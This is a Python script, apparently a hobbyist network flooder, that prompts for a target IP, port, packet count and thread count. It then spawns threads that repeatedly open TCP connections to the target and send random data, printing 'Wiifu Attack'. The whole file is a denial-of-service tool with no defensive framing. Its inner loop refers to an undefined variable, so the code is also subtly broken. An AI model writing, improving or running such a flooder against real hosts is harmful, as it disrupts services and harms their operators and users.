import socket
import threading
import random

print("""\033[95m
      _ _               _        _ 
  ___(_) | _____  _ __ | |_ ___ | |
 / __| | |/ / _ \| '_ \| __/ _ \| |
 \__ \ |   < (_) | | | | || (_) | |
 |___/_|_|\_\___/|_| |_|\__\___/|_|
                                   """)
                                  
ip_wibu = str(input("[ip] : ")) 
port_wibu = int(input("[port] : "))
paket_wibu = int(input("[paket] : "))
threads_wibu = int(input("[thread] : "))

def wibu():
	peju = random._urandom(1232)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip_wibu,port_wibu))
			s.send(peju)
			for x in range(times):
				s.send(peju)
			print("Wiifu Attack")
		except:
			s.close()
			print("Wiifu Attack")

            
for y in range(threads_wibu):
    th = threading.Thread(target = wibu)
    th.start()

